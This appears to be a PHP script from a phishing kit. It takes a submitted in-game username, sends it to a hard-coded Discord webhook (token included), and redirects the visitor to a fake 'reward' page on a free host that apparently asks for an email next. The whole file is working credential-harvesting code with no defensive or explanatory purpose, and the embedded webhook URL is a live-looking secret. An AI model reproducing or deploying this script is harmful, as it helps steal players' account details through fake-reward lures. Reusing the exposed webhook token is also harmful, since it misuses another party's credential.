<?php

// Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1096427685137350736/qFtMEj91dhCWtAykgMLQBx9xtvAV4pR3e7Ch0CEqwmag8IH78YIvuFNCiXy0DSB4OWaL";

// Get username from form data
$username = $_POST["ign"];

// Create Discord webhook embed
$embed = [
    "title" => "Username Entered",
    "description" => "**Username:** " . $username
];

// Send embed to Discord webhook
$data = [
    "embeds" => [$embed]
];
$options = [
    "http" => [
        "header"  => "Content-type: application/json",
        "method"  => "POST",
        "content" => json_encode($data)
    ]
];
$context  = stream_context_create($options);
$result = file_get_contents($webhookUrl, false, $context);

header('Location: https://incluviousinc.000webhostapp.com/reward/S9Yg3/email.html');
exit;


?>
